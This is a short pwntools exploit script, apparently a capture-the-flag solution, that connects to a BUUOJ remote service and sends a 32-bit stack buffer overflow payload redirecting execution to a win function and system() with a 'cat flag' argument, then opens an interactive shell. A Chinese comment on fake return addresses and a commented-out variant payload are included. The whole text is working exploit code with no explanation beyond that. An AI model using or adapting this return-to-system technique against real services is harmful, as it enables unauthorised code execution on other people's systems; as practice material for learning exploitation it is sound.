from pwn import *

e = ELF('./memory')
cat_flag = 0x80487e0
winfunc = 0x80485bd
system_addr =0x8048440
io = remote('node4.buuoj.cn', 28409)

io.info(hex(e.sym['system']))

# 调winfunc时，假的ret_addr不能写0xdeadbeef，可能是服务端存在检查吧，要写个正常的返回地址才行，比如system_addr
payload = b'a'*(0x13+4) + p32(winfunc) + p32(system_addr) + p32(cat_flag)
io.sendline(payload)
io.interactive()

# e = ELF('./memory')
# offset = 0x13
# payload = b'A' * offset + p32(0xdeadbeef) + p32(e.sym['system']) + p32(e.sym['puts']) + p32(0x080487E0)
# p.sendline(payload)
# p.interactive()